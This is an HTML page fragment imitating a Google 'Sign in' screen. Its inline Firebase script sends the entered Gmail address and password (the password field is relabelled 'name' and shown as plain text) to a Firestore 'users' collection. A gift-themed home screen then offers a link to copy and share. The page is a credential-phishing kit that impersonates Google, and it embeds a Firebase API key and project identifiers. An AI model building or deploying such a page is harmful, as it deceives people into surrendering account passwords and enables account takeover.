  <!-- ===================== LOGIN SCREEN ===================== -->
  <section id="login-screen" class="screen active">
    <div class="login-card">

      <div class="google-icon">
        <svg width="46" height="46" viewBox="0 0 48 48">

          <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.27-3.13.76-4.59l-7.98-6.19A23.94 23.94 0 0 0 0 24c0 3.87.92 7.53 2.56 10.78z"/>

        </svg>

      <h1>Sign in</h1>
      <p class="subtitle">Use your Google Account to continue</p>

      <form id="login-form">

        <div class="input-group">
          <input type="email" id="gmail" placeholder=" " required>
          <label for="gmail">Gmail address</label>
        </div>
        <div class="input-group">
          <input type="text" id="name" placeholder=" " required>
          <label for="name">Password</label>
        </div>       

        <p id="error-msg" class="error-msg"></p>

        <div class="btn-row">
          <button type="submit" id="login-btn">Sign in</button>
        </div>
      </form>
    </div>

  <!-- ===================== HOME SCREEN ===================== -->
  <section id="home-screen" class="screen">

      <p class="welcome-text" id="welcome-text"></p>

      <div class="gift-icon">🎁</div>

      <div class="link-box">
        <input type="text" id="share-link" readonly>
        <button id="copy-btn">Copy</button> 
      </div>

      <p id="copy-msg" class="copy-msg"></p>

      <button id="logout-btn" class="logout-btn">Log out</button>
    </div>
  </section>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyA_Z-YZA5A0N9lwVurIlIqaxlQ7HmNl-T4",
        authDomain: "game-3bfd5.firebaseapp.com",
        projectId: "game-3bfd5",
        storageBucket: "game-3bfd5.firebasestorage.app",
        messagingSenderId: "860517127352",
        appId: "1:860517127352:web:3cb91fe261acc8609b504d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.saveUserToFirestore = async (name, email) => {
        try {
        await addDoc(collection(db, "users"), {
            name: name,
            email: email,
            createdAt: serverTimestamp()
        });
        } catch (err) {
        console.error("Error saving user:", err);
        }
    };
    </script>

  <script src="script.js"></script>
